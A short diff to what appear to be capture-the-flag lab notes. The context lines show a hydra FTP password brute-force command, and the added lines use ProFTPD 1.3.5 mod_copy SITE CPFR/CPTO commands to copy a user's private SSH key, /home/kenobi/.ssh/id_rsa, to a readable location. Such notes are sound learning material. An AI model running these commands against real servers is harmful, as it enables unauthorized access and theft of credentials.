@@ -20,3 +20,10 @@ hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV <target_ip> ftp
 -P [path to dictionary] points to the dictionary containing the list of possible passwords.
 
 # after cracking the password, login with mike user and find out the files of interest
+
+
+# proftpd mod_copy modules
+
+search_sploit -s proftpd 1.3.5
+SITE CPFR /home/kenobi/.ssh/id_rsa
+SITE CPTO /var/tmp/id_rsa
